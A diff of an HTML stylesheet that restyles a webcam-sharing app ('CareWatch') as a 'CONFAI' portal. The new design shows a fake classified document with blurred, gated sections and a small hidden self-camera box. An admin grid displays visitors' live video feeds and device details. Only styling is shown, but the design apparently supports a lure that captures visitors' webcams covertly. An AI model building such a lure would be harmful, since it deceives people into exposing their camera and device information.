@@ -3,1004 +3,1111 @@
 <head>
 <meta charset="UTF-8"/>
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>CareWatch — Always Near</title>
+<title>CONFAI · Intelligence Portal</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.4/peerjs.min.js"></script>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@300;400;500;600&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600&family=Playfair+Display:ital,wght@0,400;0,600;0,700;1,400&family=IBM+Plex+Sans:wght@300;400;500&display=swap" rel="stylesheet">
 <style>
-  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --black:#080810;--surface:#0e0e1a;--surface2:#14141f;--surface3:#1a1a28;
+  --border:#ffffff0f;--border2:#ffffff18;
+  --red:#dc2626;--amber:#d97706;--amber2:#f59e0b;
+  --green:#16a34a;--green2:#22c55e;
+  --text:#e8e8f0;--text2:#9999b0;--text3:#5a5a72;
+  --accent:#6366f1;--accent2:#818cf8;
+  --radius:6px;
+}
+html,body{height:100%;background:var(--black);color:var(--text);font-family:'IBM Plex Sans',sans-serif;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+button{cursor:pointer;font-family:inherit}
 
-  :root {
-    --cream: #faf6f0;
-    --warm: #f0e8d8;
-    --amber: #c8874a;
-    --amber-light: #e4a96a;
-    --amber-dark: #8a5a28;
-    --sage: #7a9e7e;
-    --text: #2c2018;
-    --text-soft: #7a6050;
-    --card: rgba(255,255,255,0.7);
-    --shadow: 0 8px 40px rgba(100,60,20,0.12);
-    --radius: 20px;
-  }
+/* ── CLASSIFICATION BAR ── */
+.classbar{
+  position:fixed;top:0;left:0;right:0;z-index:1000;
+  background:var(--red);
+  display:flex;align-items:center;justify-content:center;gap:20px;
+  padding:5px 20px;
+  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;font-weight:600;
+  letter-spacing:0.2em;color:white;
+  border-bottom:1px solid rgba(255,255,255,0.2);
+}
+.classbar-dot{width:5px;height:5px;border-radius:50%;background:rgba(255,255,255,0.6)}
 
-  body {
-    font-family: 'DM Sans', sans-serif;
-    background: var(--cream);
-    color: var(--text);
-    min-height: 100vh;
-    overflow-x: hidden;
-  }
+/* ── NAV ── */
+.nav{
+  position:fixed;top:29px;left:0;right:0;z-index:999;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 32px;
+  background:rgba(8,8,16,0.95);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--border);
+}
+.nav-brand{
+  font-family:'IBM Plex Mono',monospace;font-size:0.9rem;font-weight:600;
+  letter-spacing:0.15em;color:var(--text);
+  display:flex;align-items:center;gap:10px;
+}
+.nav-brand-dot{
+  width:8px;height:8px;border-radius:50%;
+  background:var(--red);
+  box-shadow:0 0 8px rgba(220,38,38,0.6);
+  animation:pulse-red 2s infinite;
+}
+@keyframes pulse-red{0%,100%{box-shadow:0 0 8px rgba(220,38,38,0.6)}50%{box-shadow:0 0 14px rgba(220,38,38,0.9)}}
 
-  /* ── BACKGROUND ── */
-  body::before {
-    content: '';
-    position: fixed; inset: 0;
-    background:
-      radial-gradient(ellipse 80% 60% at 20% 0%, rgba(200,135,74,0.08) 0%, transparent 60%),
-      radial-gradient(ellipse 60% 50% at 80% 100%, rgba(122,158,126,0.07) 0%, transparent 60%),
-      radial-gradient(ellipse 100% 80% at 50% 50%, rgba(240,232,216,0.5) 0%, transparent 100%);
-    pointer-events: none; z-index: 0;
-  }
+.nav-meta{
+  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;
+  color:var(--text3);letter-spacing:0.1em;
+  display:flex;gap:24px;align-items:center;
+}
+.nav-status{display:flex;align-items:center;gap:6px;color:var(--text2)}
+.status-dot{width:6px;height:6px;border-radius:50%;background:var(--text3)}
+.status-dot.live{background:var(--green2);animation:pulse-green 1.5s infinite}
+@keyframes pulse-green{0%,100%{box-shadow:0 0 4px rgba(34,197,94,0.5)}50%{box-shadow:0 0 10px rgba(34,197,94,0.8)}}
 
-  /* ── SCREENS ── */
-  .screen {
-    display: none;
-    position: relative; z-index: 1;
-    min-height: 100vh;
-    padding: 0 20px;
-  }
-  .screen.active { display: flex; flex-direction: column; align-items: center; justify-content: center; }
+/* ── MAIN WRAPPER ── */
+.page{padding-top:90px;min-height:100vh}
 
-  /* ── HOME SCREEN ── */
-  #screen-home {
-    text-align: center;
-    gap: 0;
-  }
+/* ════════════════════════════════════════
+   VIEWER MODE
+════════════════════════════════════════ */
+#viewer-page{display:none}
+#viewer-page.active{display:block}
 
-  .logo-wrap {
-    margin-bottom: 10px;
-  }
-  .logo-icon {
-    width: 72px; height: 72px;
-    background: linear-gradient(135deg, var(--amber), var(--amber-light));
-    border-radius: 22px;
-    display: inline-flex; align-items: center; justify-content: center;
-    box-shadow: 0 4px 24px rgba(200,135,74,0.35), 0 0 0 8px rgba(200,135,74,0.1);
-    margin-bottom: 20px;
-    animation: pulse-ring 3s ease-in-out infinite;
-  }
-  .logo-icon svg { width: 36px; height: 36px; fill: white; }
+/* DOC HERO */
+.doc-hero{
+  max-width:860px;margin:0 auto;
+  padding:60px 32px 40px;
+  border-bottom:1px solid var(--border);
+}
+.doc-classification{
+  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;font-weight:600;
+  letter-spacing:0.25em;color:var(--red);
+  margin-bottom:20px;
+  display:flex;align-items:center;gap:10px;
+}
+.doc-classification::before,.doc-classification::after{
+  content:'';flex:1;height:1px;background:rgba(220,38,38,0.3);
+}
+.doc-title{
+  font-family:'Playfair Display',serif;
+  font-size:clamp(2rem,5vw,3.2rem);
+  font-weight:700;line-height:1.15;
+  color:var(--text);margin-bottom:14px;
+}
+.doc-subtitle{
+  font-family:'Playfair Display',serif;
+  font-size:1rem;font-style:italic;
+  color:var(--text2);margin-bottom:28px;
+}
+.doc-meta-row{
+  display:flex;flex-wrap:wrap;gap:20px;
+  font-family:'IBM Plex Mono',monospace;font-size:0.7rem;
+  color:var(--text3);
+}
+.doc-meta-item{display:flex;gap:6px;align-items:center}
+.doc-meta-item span:first-child{color:var(--text3)}
+.doc-meta-item span:last-child{color:var(--text2)}
 
-  @keyframes pulse-ring {
-    0%, 100% { box-shadow: 0 4px 24px rgba(200,135,74,0.35), 0 0 0 8px rgba(200,135,74,0.1); }
-    50% { box-shadow: 0 4px 24px rgba(200,135,74,0.5), 0 0 0 16px rgba(200,135,74,0.05); }
-  }
+/* DOC CONTENT AREA */
+.doc-content{
+  max-width:860px;margin:0 auto;
+  padding:40px 32px;
+  position:relative;
+}
 
-  h1.brand {
-    font-family: 'Cormorant Garamond', serif;
-    font-size: clamp(2.8rem, 7vw, 4.5rem);
-    font-weight: 500;
-    letter-spacing: -0.02em;
-    line-height: 1;
-    color: var(--text);
-    margin-bottom: 8px;
-  }
-  h1.brand span { color: var(--amber); }
+/* ACCESS GATE */
+.access-gate{
+  position:relative;
+  margin-bottom:40px;
+}
+.gate-preview{
+  /* Show first bit of content */
+}
+.gate-blur{
+  position:relative;
+  overflow:hidden;
+}
+.gate-blur::after{
+  content:'';
+  position:absolute;bottom:0;left:0;right:0;height:200px;
+  background:linear-gradient(to bottom, transparent, var(--black));
+  pointer-events:none;
+}
+.gate-lock{
+  background:var(--surface);
+  border:1px solid var(--border2);
+  border-radius:10px;
+  padding:36px;
+  text-align:center;
+  margin-top:32px;
+  position:relative;
+  overflow:hidden;
+}
+.gate-lock::before{
+  content:'';position:absolute;inset:0;
+  background:radial-gradient(ellipse 80% 60% at 50% 0%, rgba(99,102,241,0.06) 0%, transparent 70%);
+}
+.gate-icon{font-size:2rem;margin-bottom:16px}
+.gate-lock h3{
+  font-family:'Playfair Display',serif;
+  font-size:1.4rem;font-weight:600;
+  margin-bottom:10px;color:var(--text);
+}
+.gate-lock p{
+  font-size:0.85rem;color:var(--text2);line-height:1.7;
+  max-width:480px;margin:0 auto 24px;
+}
+.gate-notice{
+  background:rgba(217,119,6,0.08);
+  border:1px solid rgba(217,119,6,0.2);
+  border-radius:6px;padding:12px 16px;
+  font-size:0.75rem;color:rgba(245,158,11,0.85);
+  margin-bottom:20px;line-height:1.6;
+  font-family:'IBM Plex Mono',monospace;
+  text-align:left;
+}
+.btn-access{
+  display:inline-flex;align-items:center;gap:10px;
+  background:var(--accent);
+  color:white;border:none;
+  padding:13px 32px;border-radius:6px;
+  font-family:'IBM Plex Mono',monospace;
+  font-size:0.78rem;font-weight:600;
+  letter-spacing:0.1em;
+  transition:all 0.2s;
+  box-shadow:0 4px 20px rgba(99,102,241,0.3);
+}
+.btn-access:hover{background:#4f52e0;transform:translateY(-1px);box-shadow:0 6px 28px rgba(99,102,241,0.4)}
+.btn-access:disabled{opacity:0.5;cursor:not-allowed;transform:none}
 
-  .tagline {
-    font-size: 1rem;
-    color: var(--text-soft);
-    font-weight: 300;
-    letter-spacing: 0.05em;
-    text-transform: uppercase;
-    margin-bottom: 48px;
-  }
+/* GRANTED STATE */
+.access-granted-bar{
+  display:none;
+  background:rgba(22,163,74,0.08);
+  border:1px solid rgba(22,163,74,0.2);
+  border-radius:6px;padding:10px 16px;
+  font-family:'IBM Plex Mono',monospace;font-size:0.72rem;
+  color:rgba(34,197,94,0.85);
+  margin-bottom:24px;
+  align-items:center;gap:10px;
+}
+.access-granted-bar.show{display:flex}
 
-  .home-cards {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 16px;
-    max-width: 560px;
-    width: 100%;
-    margin-bottom: 32px;
-  }
+/* DOC SECTIONS */
+.doc-section{
+  margin-bottom:44px;
+  opacity:0;
+  transition:opacity 0.5s ease;
+}
+.doc-section.visible{opacity:1}
+.doc-section.locked{
+  filter:blur(5px);
+  user-select:none;
+  pointer-events:none;
+}
+.section-header{
+  display:flex;align-items:center;gap:12px;
+  margin-bottom:20px;
+  padding-bottom:10px;
+  border-bottom:1px solid var(--border);
+}
+.section-num{
+  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;
+  color:var(--accent2);font-weight:600;letter-spacing:0.1em;
+  background:rgba(99,102,241,0.1);
+  padding:3px 8px;border-radius:3px;
+}
+.section-title{
+  font-family:'Playfair Display',serif;
+  font-size:1.2rem;font-weight:600;color:var(--text);
+}
+.doc-p{
+  font-size:0.88rem;color:var(--text2);line-height:1.85;
+  margin-bottom:14px;
+}
+.doc-p strong{color:var(--text);font-weight:500}
 
-  @media (max-width: 480px) { .home-cards { grid-template-columns: 1fr; } }
+.doc-highlight{
+  background:rgba(99,102,241,0.06);
+  border-left:3px solid var(--accent);
+  padding:14px 18px;border-radius:0 6px 6px 0;
+  margin:16px 0;
+  font-size:0.85rem;color:var(--text2);line-height:1.8;
+  font-style:italic;
+}
+.doc-highlight strong{color:var(--accent2);font-style:normal}
 
-  .role-card {
-    background: var(--card);
-    border: 1.5px solid rgba(200,135,74,0.15);
-    border-radius: var(--radius);
-    padding: 28px 24px;
-    cursor: pointer;
-    transition: all 0.25s ease;
-    backdrop-filter: blur(10px);
-    text-align: left;
-    box-shadow: var(--shadow);
-  }
-  .role-card:hover {
-    transform: translateY(-4px);
-    border-color: var(--amber);
-    box-shadow: 0 16px 50px rgba(100,60,20,0.16);
-  }
+.tag-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));
+  gap:10px;margin:16px 0;
+}
+.tag-item{
+  background:var(--surface2);border:1px solid var(--border);
+  border-radius:6px;padding:12px 14px;
+}
+.tag-item .tag-label{
+  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;
+  color:var(--accent2);letter-spacing:0.08em;margin-bottom:4px;
+}
+.tag-item .tag-val{font-size:0.82rem;color:var(--text2)}
 
-  .role-icon {
-    width: 44px; height: 44px;
-    border-radius: 12px;
-    display: flex; align-items: center; justify-content: center;
-    margin-bottom: 14px;
-    font-size: 22px;
-  }
-  .role-icon.orange { background: rgba(200,135,74,0.12); }
-  .role-icon.green { background: rgba(122,158,126,0.12); }
+.doc-table{width:100%;border-collapse:collapse;margin:16px 0;font-size:0.8rem}
+.doc-table th{
+  background:var(--surface3);
+  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;
+  letter-spacing:0.08em;color:var(--text3);
+  padding:8px 12px;text-align:left;
+  border-bottom:1px solid var(--border2);
+}
+.doc-table td{
+  padding:9px 12px;color:var(--text2);
+  border-bottom:1px solid var(--border);
+}
+.doc-table tr:last-child td{border-bottom:none}
+.doc-table td:first-child{color:var(--accent2);font-family:'IBM Plex Mono',monospace;font-size:0.72rem}
 
-  .role-card h3 {
-    font-family: 'Cormorant Garamond', serif;
-    font-size: 1.4rem;
-    font-weight: 500;
-    margin-bottom: 6px;
-    color: var(--text);
-  }
-  .role-card p {
-    font-size: 0.82rem;
-    color: var(--text-soft);
-    line-height: 1.5;
-  }
+/* MINI SELF-CAM */
+#selfCam{
+  position:fixed;bottom:20px;right:20px;
+  width:80px;height:60px;
+  border-radius:6px;overflow:hidden;
+  border:1px solid var(--border2);
+  opacity:0.4;
+  display:none;
+  z-index:500;
+}
+#selfCam video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
+#selfCam:hover{opacity:0.9}
 
-  .role-card .arrow {
-    margin-top: 16px;
-    color: var(--amber);
-    font-size: 1.2rem;
-    display: inline-block;
-    transition: transform 0.2s;
-  }
-  .role-card:hover .arrow { transform: translateX(5px); }
+/* ════════════════════════════════════════
+   ADMIN MODE
+════════════════════════════════════════ */
+#admin-page{display:none}
+#admin-page.active{display:block}
 
-  .home-note {
-    font-size: 0.78rem;
-    color: var(--text-soft);
-    max-width: 400px;
-    line-height: 1.6;
-    opacity: 0.8;
-  }
+.admin-header{
+  max-width:1200px;margin:0 auto;
+  padding:40px 32px 24px;
+  display:flex;align-items:flex-start;justify-content:space-between;
+  flex-wrap:wrap;gap:20px;
+  border-bottom:1px solid var(--border);
+}
+.admin-header-left h2{
+  font-family:'Playfair Display',serif;font-size:1.8rem;font-weight:600;
+  margin-bottom:6px;
+}
+.admin-header-left p{font-size:0.82rem;color:var(--text3)}
 
-  /* ── HOST SCREEN ── */
-  #screen-host {
-    gap: 0;
-    padding: 30px 20px;
-  }
+.admin-stats{
+  display:flex;gap:16px;flex-wrap:wrap;
+}
+.stat-card{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:6px;padding:12px 18px;min-width:100px;
+  font-family:'IBM Plex Mono',monospace;
+}
+.stat-label{font-size:0.6rem;letter-spacing:0.12em;color:var(--text3);margin-bottom:4px}
+.stat-value{font-size:1.5rem;color:var(--text);font-weight:600}
 
-  .host-header {
-    text-align: center;
-    margin-bottom: 28px;
-  }
-  .host-header h2 {
-    font-family: 'Cormorant Garamond', serif;
-    font-size: 2rem;
-    font-weight: 500;
-    margin-bottom: 6px;
-  }
-  .host-header p { font-size: 0.88rem; color: var(--text-soft); }
+/* ADMIN GRID */
+.admin-grid-wrap{
+  max-width:1200px;margin:0 auto;
+  padding:28px 32px;
+}
+.admin-grid-label{
+  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;
+  color:var(--text3);letter-spacing:0.12em;
+  margin-bottom:16px;
+}
+.admin-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(300px,1fr));
+  gap:16px;
+}
 
-  .host-layout {
-    display: grid;
-    grid-template-columns: 1fr 340px;
-    gap: 20px;
-    width: 100%;
-    max-width: 900px;
-  }
+/* VIEWER CARD */
+.viewer-card{
+  background:var(--surface);border:1px solid var(--border);
+  border-radius:10px;overflow:hidden;
+  cursor:pointer;
+  transition:all 0.2s;
+  position:relative;
+}
+.viewer-card:hover{border-color:var(--border2);transform:translateY(-2px);box-shadow:0 8px 32px rgba(0,0,0,0.4)}
 
-  @media (max-width: 700px) { .host-layout { grid-template-columns: 1fr; } }
+.card-feed{
+  position:relative;aspect-ratio:16/10;
+  background:#050508;overflow:hidden;
+}
+.card-feed video{width:100%;height:100%;object-fit:cover;display:block}
+.card-feed-offline{
+  position:absolute;inset:0;display:flex;flex-direction:column;
+  align-items:center;justify-content:center;
+  color:var(--text3);gap:8px;font-size:0.75rem;
+  font-family:'IBM Plex Mono',monospace;
+}
+.card-feed-offline .feed-icon{font-size:1.5rem;opacity:0.4}
+.card-live-badge{
+  position:absolute;top:8px;left:8px;
+  background:rgba(220,38,38,0.9);
+  font-family:'IBM Plex Mono',monospace;font-size:0.6rem;font-weight:600;
+  letter-spacing:0.1em;color:white;
+  padding:3px 8px;border-radius:3px;
+  display:none;align-items:center;gap:5px;
+}
+.card-live-badge.show{display:flex}
+.card-live-dot{width:5px;height:5px;border-radius:50%;background:white;animation:blink 1s infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.2}}
 
-  .video-box {
-    position: relative;
-    background: #1a1108;
-    border-radius: var(--radius);
-    overflow: hidden;
-    aspect-ratio: 4/3;
-    box-shadow: 0 12px 40px rgba(0,0,0,0.2);
-  }
+.card-body{padding:14px 16px}
+.card-access-label{
+  font-family:'IBM Plex Mono',monospace;font-size:0.75rem;font-weight:600;
+  color:var(--accent2);letter-spacing:0.1em;margin-bottom:10px;
+  display:flex;align-items:center;justify-content:space-between;
+}
+.card-connected-at{font-size:0.65rem;color:var(--text3);font-weight:400;letter-spacing:0}
 
-  #localVideo {
-    width: 100%; height: 100%;
-    object-fit: cover;
-    display: block;
-    transform: scaleX(-1);
-  }
+.device-info{display:grid;grid-template-columns:1fr 1fr;gap:6px;margin-top:8px}
+.di-item{background:var(--surface2);border-radius:4px;padding:6px 8px}
+.di-label{font-family:'IBM Plex Mono',monospace;font-size:0.58rem;color:var(--text3);letter-spacing:0.08em;margin-bottom:2px}
+.di-val{font-size:0.72rem;color:var(--text2);word-break:break-all}
 
-  .live-badge {
-    position: absolute;
-    top: 14px; left: 14px;
-    background: rgba(220,50,50,0.9);
-    color: white;
-    font-size: 0.7rem;
-    font-weight: 500;
-    letter-spacing: 0.1em;
-    padding: 4px 10px;
-    border-radius: 20px;
-    display: flex; align-items: center; gap: 6px;
-    display: none;
-  }
-  .live-badge.show { display: flex; }
-  .live-dot {
-    width: 7px; height: 7px;
-    background: white;
-    border-radius: 50%;
-    animation: blink 1.2s ease-in-out infinite;
-  }
-  @keyframes blink { 0%,100% { opacity:1 } 50% { opacity:0.3 } }
+.card-status-row{
+  display:flex;align-items:center;gap:6px;
+  margin-top:10px;padding-top:10px;
+  border-top:1px solid var(--border);
+  font-size:0.7rem;color:var(--text3);
+  font-family:'IBM Plex Mono',monospace;
+}
 
-  .viewer-count-badge {
-    position: absolute;
-    top: 14px; right: 14px;
-    background: rgba(0,0,0,0.5);
-    color: white;
-    font-size: 0.75rem;
-    padding: 4px 10px;
-    border-radius: 20px;
-    display: none;
-  }
-  .viewer-count-badge.show { display: block; }
+/* FULLSCREEN OVERLAY */
+.fullscreen-overlay{
+  display:none;
+  position:fixed;inset:0;z-index:2000;
+  background:rgba(0,0,0,0.97);
+  flex-direction:column;
+}
+.fullscreen-overlay.show{display:flex}
+.fs-topbar{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 20px;
+  background:rgba(14,14,26,0.8);
+  border-bottom:1px solid var(--border);
+  flex-shrink:0;
+}
+.fs-label{
+  font-family:'IBM Plex Mono',monospace;font-size:0.8rem;
+  font-weight:600;color:var(--accent2);letter-spacing:0.1em;
+}
+.fs-close{
+  background:var(--surface2);border:1px solid var(--border);
+  color:var(--text2);padding:6px 14px;border-radius:4px;
+  font-family:'IBM Plex Mono',monospace;font-size:0.72rem;
+  transition:all 0.15s;
+}
+.fs-close:hover{border-color:var(--border2);color:var(--text)}
+.fs-main{flex:1;display:flex;overflow:hidden}
+.fs-video-wrap{flex:1;display:flex;align-items:center;justify-content:center;background:#000}
+.fs-video-wrap video{max-width:100%;max-height:100%;object-fit:contain}
+.fs-sidebar{
+  width:300px;flex-shrink:0;
+  background:var(--surface);
+  border-left:1px solid var(--border);
+  padding:20px;overflow-y:auto;
+}
+.fs-sidebar h4{
+  font-family:'IBM Plex Mono',monospace;font-size:0.65rem;
+  letter-spacing:0.12em;color:var(--text3);margin-bottom:14px;
+}
+.fs-di-item{margin-bottom:12px}
+.fs-di-label{font-family:'IBM Plex Mono',monospace;font-size:0.6rem;color:var(--text3);letter-spacing:0.08em;margin-bottom:3px}
+.fs-di-val{font-size:0.8rem;color:var(--text2)}
 
-  .cam-placeholder {
-    position: absolute;
-    inset: 0;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    color: rgba(255,255,255,0.5);
-    gap: 12px;
-  }
-  .cam-placeholder svg { width: 48px; height: 48px; opacity: 0.4; }
-  .cam-placeholder p { font-size: 0.85rem; }
+/* WAITING STATE */
+.admin-waiting{
+  text-align:center;padding:80px 32px;
+  font-family:'IBM Plex Mono',monospace;color:var(--text3);
+}
+.admin-waiting .wait-icon{font-size:2.5rem;margin-bottom:16px;opacity:0.4}
+.admin-waiting p{font-size:0.8rem;letter-spacing:0.05em;line-height:1.8}
+.admin-waiting .share-link{
+  display:inline-block;margin-top:20px;
+  background:var(--surface2);border:1px solid var(--border2);
+  border-radius:6px;padding:10px 18px;
+  font-size:0.72rem;color:var(--accent2);
+  word-break:break-all;
+}
 
-  .host-sidebar {
-    display: flex;
-    flex-direction: column;
-    gap: 14px;
-  }
+/* TOAST */
+.toast{
+  position:fixed;bottom:24px;left:50%;transform:translateX(-50%);
+  background:var(--surface3);border:1px solid var(--border2);
+  color:var(--text);padding:10px 20px;border-radius:6px;
+  font-size:0.8rem;opacity:0;pointer-events:none;
+  transition:opacity 0.25s;z-index:3000;
+  font-family:'IBM Plex Mono',monospace;
+  white-space:nowrap;
+}
+.toast.show{opacity:1}
 
-  .info-card {
-    background: var(--card);
-    border: 1.5px solid rgba(200,135,74,0.12);
-    border-radius: 16px;
-    padding: 20px;
-    backdrop-filter: blur(10px);
-    box-shadow: var(--shadow);
-  }
+/* SPINNER */
+.spin{
+  width:14px;height:14px;border:2px solid rgba(255,255,255,0.2);
+  border-top-color:white;border-radius:50%;
+  animation:spin 0.7s linear infinite;display:inline-block;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
 
-  .info-card label {
-    font-size: 0.72rem;
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
-    color: var(--text-soft);
-    display: block;
-    margin-bottom: 8px;
-  }
-
-  .share-url-box {
-    background: var(--warm);
-    border-radius: 10px;
-    padding: 10px 14px;
-    font-size: 0.75rem;
-    color: var(--text-soft);
-    word-break: break-all;
-    line-height: 1.5;
-    margin-bottom: 10px;
-    font-family: monospace;
-    min-height: 40px;
-  }
-
-  .btn {
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-    padding: 10px 20px;
-    border-radius: 12px;
-    border: none;
-    cursor: pointer;
-    font-family: 'DM Sans', sans-serif;
-    font-size: 0.85rem;
-    font-weight: 500;
-    transition: all 0.2s;
-    width: 100%;
-  }
-  .btn-amber {
-    background: linear-gradient(135deg, var(--amber), var(--amber-light));
-    color: white;
-    box-shadow: 0 4px 16px rgba(200,135,74,0.3);
-  }
-  .btn-amber:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(200,135,74,0.4); }
-  .btn-outline {
-    background: transparent;
-    border: 1.5px solid rgba(200,135,74,0.3);
-    color: var(--amber-dark);
-  }
-  .btn-outline:hover { border-color: var(--amber); background: rgba(200,135,74,0.05); }
-  .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
-
-  .status-row {
-    display: flex; align-items: center; gap: 8px;
-    font-size: 0.82rem;
-    color: var(--text-soft);
-  }
-  .status-dot {
-    width: 9px; height: 9px; border-radius: 50%;
-    background: #ccc;
-    flex-shrink: 0;
-  }
-  .status-dot.green { background: var(--sage); box-shadow: 0 0 0 3px rgba(122,158,126,0.2); }
-  .status-dot.amber { background: var(--amber); box-shadow: 0 0 0 3px rgba(200,135,74,0.2); animation: blink 1.5s infinite; }
-  .status-dot.red { background: #dc3545; }
-
-  .session-id-display {
-    font-family: monospace;
-    font-size: 1.6rem;
-    letter-spacing: 0.2em;
-    color: var(--amber-dark);
-    font-weight: 600;
-    text-align: center;
-    padding: 8px 0;
-  }
-
-  .host-tip {
-    font-size: 0.78rem;
-    color: var(--text-soft);
-    line-height: 1.6;
-    background: rgba(122,158,126,0.08);
-    border-left: 3px solid var(--sage);
-    padding: 10px 14px;
-    border-radius: 0 8px 8px 0;
-  }
-
-  /* ── VIEWER SCREEN ── */
-  #screen-viewer {
-    gap: 0;
-    padding: 30px 20px;
-  }
-
-  .viewer-header {
-    text-align: center;
-    margin-bottom: 24px;
-  }
-  .viewer-header h2 {
-    font-family: 'Cormorant Garamond', serif;
-    font-size: 2rem;
-    font-weight: 500;
-    margin-bottom: 4px;
-  }
-  .viewer-header p { font-size: 0.85rem; color: var(--text-soft); }
-
-  .viewer-layout {
-    display: grid;
-    grid-template-columns: 1fr 280px;
-    gap: 20px;
-    width: 100%;
-    max-width: 960px;
-  }
-  @media (max-width: 700px) { .viewer-layout { grid-template-columns: 1fr; } }
-
-  #remoteVideo {
-    width: 100%; height: 100%;
-    object-fit: cover;
-    display: block;
-  }
-
-  .connect-overlay {
-    position: absolute;
-    inset: 0;
-    background: rgba(26,17,8,0.85);
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    color: white;
-    gap: 16px;
-    border-radius: var(--radius);
-  }
-
-  .spinner {
-    width: 40px; height: 40px;
-    border: 3px solid rgba(255,255,255,0.15);
-    border-top-color: var(--amber-light);
-    border-radius: 50%;
-    animation: spin 0.9s linear infinite;
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
-
-  .connect-overlay p { font-size: 0.85rem; opacity: 0.7; }
-
-  .connect-form {
-    display: flex;
-    flex-direction: column;
-    gap: 10px;
-    width: 100%;
-  }
-
-  input.code-input {
-    font-family: monospace;
-    font-size: 1.6rem;
-    letter-spacing: 0.2em;
-    text-align: center;
-    padding: 12px;
-    border: 2px solid rgba(200,135,74,0.3);
-    border-radius: 12px;
-    background: var(--warm);
-    color: var(--amber-dark);
-    outline: none;
-    font-weight: 600;
-    width: 100%;
-    text-transform: uppercase;
-  }
-  input.code-input:focus { border-color: var(--amber); }
-  input.code-input::placeholder { color: rgba(138,90,40,0.3); font-size: 1rem; letter-spacing: 0.05em; }
-
-  .viewer-sidebar {
-    display: flex;
-    flex-direction: column;
-    gap: 14px;
-  }
-
-  .metric-card {
-    background: var(--card);
-    border: 1.5px solid rgba(200,135,74,0.12);
-    border-radius: 14px;
-    padding: 16px 18px;
-    backdrop-filter: blur(10px);
-  }
-  .metric-card label {
-    font-size: 0.7rem;
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
-    color: var(--text-soft);
-    display: block;
-    margin-bottom: 4px;
-  }
-  .metric-value {
-    font-family: 'Cormorant Garamond', serif;
-    font-size: 1.8rem;
-    color: var(--text);
-    font-weight: 500;
-  }
-  .metric-unit { font-size: 0.8rem; color: var(--text-soft); margin-left: 4px; }
-
-  .fullscreen-btn {
-    position: absolute;
-    bottom: 14px; right: 14px;
-    background: rgba(0,0,0,0.5);
-    border: none;
-    color: white;
-    width: 36px; height: 36px;
-    border-radius: 8px;
-    cursor: pointer;
-    display: flex; align-items: center; justify-content: center;
-    transition: background 0.2s;
-  }
-  .fullscreen-btn:hover { background: rgba(0,0,0,0.75); }
-
-  /* ── TOAST ── */
-  .toast {
-    position: fixed;
-    bottom: 30px; left: 50%; transform: translateX(-50%);
-    background: var(--text);
-    color: white;
-    padding: 12px 24px;
-    border-radius: 30px;
-    font-size: 0.85rem;
-    opacity: 0;
-    transition: opacity 0.3s;
-    z-index: 999;
-    white-space: nowrap;
-    pointer-events: none;
-  }
-  .toast.show { opacity: 1; }
-
-  /* ── BACK BTN ── */
-  .back-btn {
-    position: fixed;
-    top: 20px; left: 20px;
-    background: var(--card);
-    border: 1.5px solid rgba(200,135,74,0.2);
-    border-radius: 10px;
-    padding: 8px 14px;
-    font-size: 0.8rem;
-    color: var(--text-soft);
-    cursor: pointer;
-    backdrop-filter: blur(10px);
-    transition: all 0.2s;
-    z-index: 100;
-    font-family: 'DM Sans', sans-serif;
-    display: none;
-  }
-  .back-btn.show { display: block; }
-  .back-btn:hover { border-color: var(--amber); color: var(--amber-dark); }
-
-  .how-it-works {
-    background: var(--card);
-    border: 1.5px solid rgba(200,135,74,0.12);
-    border-radius: 14px;
-    padding: 16px 18px;
-    backdrop-filter: blur(10px);
-  }
-  .how-it-works h4 {
-    font-size: 0.75rem;
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
-    color: var(--text-soft);
-    margin-bottom: 12px;
-  }
-  .how-step {
-    display: flex; align-items: flex-start; gap: 10px;
-    margin-bottom: 10px;
-    font-size: 0.8rem;
-    color: var(--text-soft);
-    line-height: 1.5;
-  }
-  .how-step:last-child { margin-bottom: 0; }
-  .how-num {
-    width: 20px; height: 20px;
-    border-radius: 50%;
-    background: rgba(200,135,74,0.15);
-    color: var(--amber-dark);
-    font-size: 0.7rem;
-    display: flex; align-items: center; justify-content: center;
-    flex-shrink: 0;
-    font-weight: 600;
-  }
-
-  /* ANIMATIONS */
-  .fade-in { animation: fadeIn 0.5s ease forwards; }
-  @keyframes fadeIn { from { opacity:0; transform:translateY(16px); } to { opacity:1; transform:translateY(0); } }
+/* ANIMATIONS */
+@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.fade-up{animation:fadeUp 0.5s ease forwards}
 </style>
 </head>
